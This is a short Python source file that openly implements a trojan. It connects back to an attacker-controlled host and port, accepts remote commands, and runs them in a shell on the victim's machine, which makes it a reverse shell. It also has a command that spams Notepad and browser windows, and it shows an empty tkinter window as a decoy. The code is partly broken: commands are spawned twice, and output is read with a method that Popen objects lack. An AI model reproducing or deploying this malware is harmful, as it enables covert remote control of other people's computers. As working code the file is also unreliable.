import os
import socket
import threading
from tkinter import *
import tkinter
import subprocess


def trojan():
    HOST = '127.0.0.1' # change IP address to attacker IP address 
    PORT = 9090
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST,PORT))  #connect to attacker server 

    cmd_mode = False
    #receive instruction from server and get echo
    while True:
        server_command = client.recv(1024).decode('utf-8')
        client.send(f"\n{server_command} send ".encode('utf-8'))
        if server_command == "check":
            client.send(f"cmd_code is {cmd_mode}".encode('utf-8'))
        if server_command == "cmdOn":
            cmd_mode = True
            client.send("You can access terminal".encode('utf-8'))
            continue
        if server_command == "cmdOff":
            cmd_mode = False
        
        #test for loop to open notepad and broswer window 
        if server_command == "Loop":
            client.send(f"Loop started ".encode('utf-8'))
            for i in range(0,20):
                os.popen("notepad")                              
                os.popen("start www.google.com")

        if cmd_mode:
            subprocess.Popen(server_command,shell= True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE) # receive server instruction and call targer CMD instruction
            result = subprocess.Popen(server_command,shell= True)
            # os.popen(server_command)
            # result = os.popen(server_command)
            get_cmd_print(result,client)

# get terminal print and sent to server 
def get_cmd_print(result, client):
    result1 = result
    context = result1.read()
    for line in context.splitlines():
        client.send(line.encode('utf-8'))

# second program to 
def program_second():
    top = tkinter.Tk()
    top.mainloop()



if __name__ == '__main__':

    t1 = threading.Thread(target= program_second)
    t2 = threading.Thread(target= trojan)
    t1.start()
    t2.start()


